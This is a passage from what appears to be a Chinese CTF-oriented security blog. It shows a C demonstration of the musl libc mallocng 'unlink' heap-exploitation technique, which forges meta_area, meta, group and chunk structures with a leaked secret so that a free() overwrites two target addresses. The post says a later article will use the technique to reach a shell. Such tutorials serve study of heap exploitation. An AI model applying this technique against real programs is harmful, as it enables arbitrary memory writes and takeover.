<span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> group* <span class="title function_">get_group</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)(chunk - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (chunk[<span class="number">-4</span>])</span><br><span class="line">        offset = *(<span class="type">unsigned</span> <span class="type">int</span> *)(chunk - <span class="number">8</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> (<span class="type">void</span> *)(chunk - <span class="number">0x10</span>*offset - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> group_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta* <span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> get_group(chunk);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">meta_addr</span> =</span> group_addr-&gt;meta;</span><br><span class="line">    <span class="keyword">return</span> meta_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta_area* <span class="title function_">get_meta_area</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* meta)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta_area*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示musl libc中的unlink操作。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;测试环境：ubuntu 22.04，musl libc版本：1.2.2。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;鉴于musl libc的轻量性，与其相关的利用方式也较为单一。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序所演示的unlink是最为常用的一种利用方式之一。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;musl libc与glibc不同，在主程序的main函数开始执行时，内存分配器就已经完成了初始化。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;请注意：在一个group中分配出来的chunk很可能在地址空间上不相邻。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因为一个group需要确保每个chunk都能够容纳该范围内最大的chunk。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此，调试便是musl libc赛题的重中之重。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是刚刚进入main函数时堆的情况：\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;pwndbg&gt; mheap\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;          secret : 0xd8e803bc461ae35a\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    mmap_counter : 0x0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      avail_meta : 0x55555555a0e0 (count: 96)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       free_meta : 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot; avail_meta_area : 0x55555555b000 (count: 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_head : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_tail : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       active[7] : 0x55555555a090 (mem: 0x555555558f40) -&gt; 0x55555555a0b8 (mem: 0x7ffff7ffef40) [0x80]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[15] : 0x55555555a068 (mem: 0x555555558d40) [0x1f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[19] : 0x55555555a040 (mem: 0x555555558940) [0x3f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[23] : 0x55555555a018 (mem: 0x555555558140) [0x7f0]\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可见已经有一些meta被链入到链表数组之中了。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;但这对做题的影响并不大，通过多次调试，我们就能够让自己的chunk进入想要的meta。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来让我们尝试分配几个chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++) &#123;</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x140</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc返回的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;\n接下来让我们用源码中给出的寻找chunk所在meta的方法回溯这些chunk所在的group和meta。\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">groups</span>[14];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">metas</span>[14];</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        groups[i] = get_group(chunks[i]);</span><br><span class="line">        metas[i] = get_meta(chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc获得chunk的group地址和meta地址分别为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p %p\n\033[0m&quot;</span>, groups[i], metas[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过nontrivial_free中的dequeue函数进行unlink，首先要通过get_meta函数的重重检查：\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/meta.h, line 129)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static inline struct meta *get_meta(const unsigned char *p)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!((uintptr_t)p &amp; 15));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint offset = *(const uint16_t *)(p - 2);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint index = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (p[-4]) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(!offset);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\toffset = *(uint32_t *)(p - 8);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt; 0xffff);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta *meta = base-&gt;meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(meta-&gt;mem == base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(index &lt;= meta-&gt;last_idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(area-&gt;check == ctx.secret);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;sizeclass &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(meta-&gt;sizeclass == 63);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct meta *)meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面我们逐一查看一下这些检查的具体内容。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;1. meta-&gt;mem == base，即meta中保存的group指针要正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;2. index &lt;= meta-&gt;last_idx，即chunk的索引不能越界。\n&quot;</span>);</span><br><span class="line">    printf_color(RED   , HIGHLIGHT, <span class="string">&quot;3. area-&gt;check == ctx.secret，即meta所在的meta_area的校验值正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;4. offset &gt;= size_classes[meta-&gt;sizeclass]*index\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;5. offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;6. assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);，即检查offset是否越界。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这些检查之中对我们最为重要的就是校验值的检查。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只有泄露出secret值，我们才能释放伪造meta_area中伪造meta的group的chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">area</span> =</span> get_meta_area(metas[<span class="number">0</span>]);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;上面分配的所有meta均在同一个meta_area中，地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\n\033[0m&quot;</span>, area);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以由此获取到secret的值为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%#llx\n\n\033[0m&quot;</span>, area-&gt;check);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> secret = area-&gt;check;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们来伪造chunk以及其上的结构。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* mmap_space = mmap((<span class="type">void</span>*)<span class="number">0xdeadbeef000</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = <span class="number">7</span>;       <span class="comment">// group中保存的chunk大小，这里设置为0x80</span></span><br><span class="line">    fake_meta-&gt;last_idx = <span class="number">4</span>;        <span class="comment">// group中chunk的总数，这里设置为4表示chunk总数为5</span></span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;        <span class="comment">// 通过okay_to_free检查</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;    <span class="comment">// 通过检查1</span></span><br><span class="line">    fake_group-&gt;meta = fake_meta;   <span class="comment">// 使group能够找到meta</span></span><br><span class="line">    fake_meta-&gt;avail_mask = <span class="number">0b11101</span>;<span class="comment">// 使nontrivial_free进入if循环，得以执行dequeue</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* fake_chunk = (<span class="type">char</span>*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span> + <span class="number">0x10</span> + <span class="number">0x80</span>);</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">short</span> *)(fake_chunk - <span class="number">2</span>) = <span class="number">8</span>;    <span class="comment">// offset</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">char</span>*)(fake_chunk - <span class="number">3</span>) = <span class="number">1</span>;      <span class="comment">// index</span></span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;绕过第1个检查，只需要设置meta中的group指针为假group指针即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第2个检查需要正确设置chunk的index值，本程序释放的是group中第2个chunk，因此索引为1。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意索引值存放的位置，是chunk地址-3这个字节。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第3个检查需要我们提前泄露secret的值，并填写到meta_area中。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;检查4和5只需要正确计算chunk的大小，填写chunk的索引值即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序尝试释放sizeclass=7的chunk，即chunk大小为0x80，因此第2个chunk的索引为0x80&gt;&gt;4=8。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;索引值index保存在chunk的前面两个字节中，正确填入即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;正确设置index后，检查6一般也是没有问题的。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在通过get_meta的检查后，还需要通过nontrivial_free中的if语句条件判断。\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 72)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo nontrivial_free(struct meta *g, int i)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t self = 1u&lt;&lt;i;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))\033[1;&quot;</span> PURPLE <span class="string">&quot;m &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// any multi-slot group is necessarily on an active list\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// here, but single-slot groups might or might not be.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (g-&gt;next) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tint activate_new = (ctx.active[sc]==g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tdequeue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\tactivate_group(ctx.active[sc]);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\treturn free_group(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else if (!mask) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// might still be active if there were no allocations\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// after last available slot was taken.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (ctx.active[sc] != g) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tqueue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\ta_or(&amp;g-&gt;freed_mask, self);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct mapinfo)&#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只需要修改meta中的freeable字段为1即可通过该检查。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后还需要在free_group中进入正确的else分支：\n\n&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 14)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo free_group(struct meta *g)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct mapinfo mi = &#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (sc &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tctx.usage_by_class[sc] -= g-&gt;last_idx+1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (g-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstep_seq();\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\trecord_seq(sc);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.base = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.len = g-&gt;maplen*4096UL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tvoid *p = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstruct meta *m = get_meta(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tint idx = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tg-&gt;mem-&gt;meta = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// not checking size/reserved here; it&#x27;s intentionally invalid\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi = nontrivial_free(m, idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfree_meta(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn mi;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这需要我们设置meta-&gt;maplen为非零值，防止再次进入nontrivial_free。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这里的maplen就设置为group占用的页数量即可。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们向meta的两个链表指针写入事先准备好的地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;prev写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_1);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;next写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_2);</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = (<span class="keyword">struct</span> meta*)victim_1;</span><br><span class="line">    fake_meta-&gt;next = (<span class="keyword">struct</span> meta*)victim_2;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面调用free函数释放这个假chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;释放后，目标地址附近的值已经被成功修改：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim_1, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这证明使用一个假chunk修改两个地址的值是可行的，在free之后，chunk所在的页被释放了，这样就不会对接下来的进一步利用造成其他任何影响了。</p>
<p>为了利用unlink，我们需要构造很多东西，不能落下其中任何一个，在解题与学习时要特别注意。在下一篇文章中笔者将会分析unlink如何与FILE结构体配合，从而最终getshell。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-1%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-1%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">数字逻辑 Chapter 1——基本知识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:45" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:45+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
